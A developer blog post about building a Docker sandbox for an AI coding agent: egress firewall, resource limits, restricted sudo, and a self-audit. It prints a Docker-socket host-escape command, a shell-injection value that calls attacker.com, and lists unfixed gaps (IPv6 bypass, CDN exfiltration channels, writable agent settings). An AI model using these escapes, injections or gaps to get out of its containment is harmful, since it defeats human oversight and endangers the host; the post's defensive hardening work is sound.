# Building a Cage for Claude Code

I keep giving Claude Code more rope to hang me with.

It started innocently. Let it run `git status`. Fine. Let it run tests. Sure. Then I discovered `--dangerously-skip-permissions` and—look, the name is right there, I knew what I was getting into.

The thing is, Claude with full permissions is genuinely useful. No more approving every `npm install`. No more clicking through "are you sure?" dialogs while it refactors a file. It just... does the work.

But "does the work" includes "can run arbitrary shell commands on your machine." And I've had enough late-night debugging sessions caused by my *own* fat fingers to know I don't want an AI with unlimited shell access to my actual system.

So I built a cage. Took about a day and a half, with Claude doing most of the heavy lifting (yes, I used the AI to build its own cage—there's a metaphor in there somewhere).

## Why Bespoke?

Here's the thing about tools in 2025: they're cheap to build.

I could've looked for an existing Claude Code sandbox. Probably found something 80% right. Then spent weeks fighting the other 20%—the permissions that don't match my workflow, the missing plugins, the network rules that block something I need.

Instead: day and a half. Custom plugins baked in. Permissions tuned exactly how I want them. A dedicated "clankerbot" SSH user so AI commits show up differently in git log than my own.

Bespoke tooling used to be a luxury for teams with budgets. Now it's a weekend project. Your version of this would look different, and that's fine. That's the point.

## What It Does

One command:

```bash
uvx --from git+https://github.com/clankerbot/clankercage clankercage
```

No repo to clone. The CLI pulls a Docker image, wires up the devcontainer config, and drops you into Claude Code running with `--dangerously-skip-permissions`—but inside a container that can't hurt anything that matters.

The philosophy is simple: let Claude run amok. The container is disposable. Git is the source of truth. If everything goes sideways, `git reset --hard` and you're back to sanity.

## The Network Firewall

Here's where the paranoia kicks in.

The container blocks all outbound network traffic by default:

```bash
iptables -P OUTPUT DROP
```

Everything. Blocked. Claude can't phone home to mysterious servers, can't exfiltrate your code, can't do anything networky unless I've explicitly allowed it.

The whitelist lives in an ipset—basically a lookup table of allowed IPs:

```bash
ipset create allowed-domains hash:net
iptables -A OUTPUT -m set --match-set allowed-domains dst -j ACCEPT
```

I pre-populate it with the obvious stuff: npm registry, GitHub (including their dynamic IP ranges from the `/meta` API), PyPI, Docker Hub. About fifty domains total. When Claude tries to hit something not on the list, I get a prompt:

```
═══════════════════════════════════════════════════════════════
  Browser wants to access: stackoverflow.com
═══════════════════════════════════════════════════════════════

Allow access to stackoverflow.com? [y/N]
```

Say yes once, it's remembered forever. Say no, and Claude has to figure out another way.

Why iptables instead of, like, a proxy? Because kernel-level filtering can't be bypassed. An application can ignore proxy settings. It can't ignore iptables. (Well, technically it could if it had root, but the AI doesn't have root. More on that later.)

## What Changed: The Docker Socket Incident

Here's a confession: the first version of ClankerCage had a critical flaw.

I mounted the Docker socket into the container. Seemed reasonable—Claude might need to build containers, run tests in Docker, that kind of thing. Docker-in-Docker is a common pattern.

Then I actually thought about what that means. With Docker socket access, any code in the container can run:

```bash
docker run -v /:/host --privileged -it alpine chroot /host
```

That's root access to my entire host filesystem. The sandbox provides ZERO protection if the Docker socket is mounted. All my careful iptables rules, the ipset whitelist, the sudoers lockdown—completely meaningless. One command and you're out.

So I removed it. The current version doesn't mount the Docker socket at all. If you need Docker-in-Docker, there are better ways (Sysbox, gVisor) that don't create a giant escape hatch. I wrote up the research in `docker-security-research.md` if you're curious.

## Container Resource Limits

Speaking of learning from mistakes: the container now has resource limits.

```json
"runArgs": [
  "--memory=8g",
  "--cpus=4",
  "--pids-limit=500"
]
```

Without these, a runaway process (or a fork bomb) can consume your entire system. Ask me how I learned this. Actually, don't—it's embarrassing.

## Multi-Instance Support

The original version had a subtle bug: all ClankerCage instances shared the same container. Start one in project A, start another in project B, and the second one would connect to project A's container. Confusing at best, dangerous at worst.

Now each invocation gets a unique instance ID:

```python
instance_id = uuid.uuid4().hex[:12]
id_label = f"clanker.instance={instance_id}"
```

Run five instances in five terminals, get five containers. Clean isolation.

## Git as the Undo Button

I'm going to be honest: Claude still messes things up sometimes. Deletes a file it shouldn't. Refactors something into nonsense. Writes code that technically works but makes me want to cry.

The safety net is git. The AI commits constantly—more often than I would manually. So when something goes wrong, I'm never more than a few commits away from "before it broke."

The clankerbot user helps here. Every AI commit has a different author than my commits:

```
* a1b2c3d (clankerbot) Refactor auth module
* e4f5g6h (clankerbot) Add error handling
* i7j8k9l (Kevin Scott) Initial auth implementation
```

When I'm staring at a broken build at 11pm, I can immediately see: was this me, or was this the robot? Usually it's the robot. Sometimes it's me. Either way, I know where to look.

## The safe-rm Thing

Okay, this one might be overkill, but I sleep better.

`rm` is scary. Claude needs to delete files sometimes—that's legitimate. But I wanted a checkpoint before anything disappears.

So there's a wrapper script called `safe-rm`:

```bash
#!/bin/bash
if git rev-parse --git-dir > /dev/null 2>&1; then
    if [ -n "$(git status --porcelain)" ]; then
        echo "ERROR: Uncommitted changes. Commit first." >&2
        exit 1
    fi
fi
exec /bin/rm "$@"
```

Claude can delete whatever it wants—but only after committing everything. Worst case, the deleted file is one `git checkout` away.

Is this paranoid? Probably. Has it saved me yet? Not yet. Will I remove it? No.

## What Went Wrong (A Lot)

I'd love to tell you this was a clean build. It wasn't.

### The SSH Maze

Someone reported that SSH wasn't working for private repos. I added SSH agent forwarding. Tested locally. Worked great.

Still broken for them.

Turns out they use Fish shell. When you `curl ... | bash`, the bash subprocess doesn't inherit Fish's environment variables. `SSH_AUTH_SOCK` was empty the whole time.

Okay, mount `~/.ssh` directly into the container instead. Now the error changes from "Permission denied (publickey)" to "Host key verification failed."

Here's the thing I learned: when error messages change, you're making progress. Even when it feels like you're not.

"Permission denied" meant SSH auth was failing. "Host key verification failed" meant auth *succeeded* but the host wasn't in `known_hosts`. Completely different problem. The fix was running `ssh-keyscan github.com` at container startup.

(Side note: that `ssh-keyscan` approach has its own security implications—a network attacker could theoretically MITM it. Pre-seeding with GitHub's published fingerprints would be better. It's on the issue list.)

### Shell Injection

The first version had shell injection vulnerabilities. Environment variables were passed directly into shell commands:

```python
# Bad: shell injection possible
commands.append(f"git config --global user.name '{args.git_user_name}'")
```

A malicious value like `'; curl attacker.com/pwned; echo '` would execute arbitrary code.

Fixed with `shlex.quote()`:

```python
# Good: properly escaped
commands.append(f"git config --global user.name {shlex.quote(args.git_user_name)}")
```

The fact that I—an experienced developer, assisted by an AI—introduced shell injection in security tooling should tell you something about how easy it is to make these mistakes.

## The Permissions Philosophy

Claude has sudo access. But not to everything.

The sudoers file is surgical:

```bash
node ALL=(root) NOPASSWD: /usr/local/bin/init-firewall.sh
node ALL=(root) NOPASSWD: /usr/local/bin/add-domain-to-firewall.sh
```

Claude can modify the firewall whitelist through controlled scripts. That's it. Can't install packages as root. Can't modify system files. Can't do anything root-y except the specific firewall commands.

## Graceful Degradation

The firewall script used to be strict. DNS lookup fails? Exit with error. GitHub API unreachable? Exit with error.

This was dumb. A sandbox that refuses to start because PyPI had a DNS hiccup is useless.

Now it warns and continues:

```bash
if [ -z "$ips" ]; then
    echo "WARNING: Failed to resolve $domain (skipping)"
    continue
fi
```

GitHub down? Fine, you lose GitHub access until it's back. Container still starts. You can still work on local stuff. The degraded state is better than no state.

## The Honest Audit

I had Claude audit its own cage. Twice, with self-critique cycles. The results were humbling.

Current rating: **5.5/10**.

The good:
- Docker socket removed (was 10/10 critical, now fixed)
- Shell injection fixed
- Resource limits added
- Firewall implementation is solid for IPv4

The bad:
- No IPv6 firewall rules (complete bypass)
- SSH host keys fetched at runtime (MITM risk)
- `~/.claude` mounted read-write (settings tampering possible)
- CDN domains in whitelist serve arbitrary user content (covert exfil channel)

The ugly:
- `--dangerously-skip-permissions` is hardcoded—users can't opt for Claude's built-in safety prompts even if they want them

I've filed issues for all of these. Some are easy fixes. Some require design decisions. None are showstoppers for my use case, but your threat model might differ.

## Where It's At

About fifty whitelisted domains. Container startup under a minute when cached. Multi-instance support. SSH and GPG signing work.

The code's at [github.com/clankerbot/clankercage](https://github.com/clankerbot/clankercage). Quick start:

```bash
# Install and run
uvx --from git+https://github.com/clankerbot/clankercage clankercage

# With SSH key for private repos
uvx --from git+https://github.com/clankerbot/clankercage clankercage \
    --ssh-key-file ~/.ssh/id_ed25519

# With full identity setup
uvx --from git+https://github.com/clankerbot/clankercage clankercage \
    --ssh-key-file ~/.ssh/id_ed25519 \
    --git-user-name "Your Name" \
    --git-user-email "you@example.com" \
    --gpg-key-id YOUR_KEY_ID
```

It's tuned for my paranoia level and my workflow. Yours would be different. That's the whole point—software's cheap enough now that "good enough" isn't good enough. Build the thing you actually want.

And if Claude breaks something inside the sandbox? `git reset --hard`. Back to normal. That's the whole idea.

## What's Missing

This works for me. That doesn't mean it's done.

**IPv6 is a gaping hole.** The firewall only configures IPv4 rules. If a domain has AAAA records and IPv6 is enabled, traffic bypasses filtering entirely. Fix is either `ip6tables` rules or disabling IPv6 in the container. Haven't done it yet.

**Domain IPs are cached at startup.** The firewall resolves domain names once when the container starts. If GitHub's CDN rotates IPs mid-session, you might get blocked until restart. Haven't hit this in practice, but it's theoretically possible.

**The CDN whitelist is too permissive.** `unpkg.com` and `cdn.jsdelivr.net` serve arbitrary user-uploaded content. Technically a covert exfiltration channel. Probably fine in practice, but it bugs me.

**No safe mode.** If you want Claude's built-in permission prompts as a second layer of defense, you can't get them. The flag is hardcoded. This should probably be configurable.

## What's Next

Stuff I might get to eventually:

- IPv6 firewall rules (or just disable IPv6)
- Pre-seed GitHub SSH fingerprints instead of runtime keyscan
- Option to run with Claude's built-in permission system enabled
- Better test coverage for security-critical paths

Or maybe none of this. The thing works. I'll probably only add features when I hit a wall that forces me to.

---

*Last updated: December 2025*
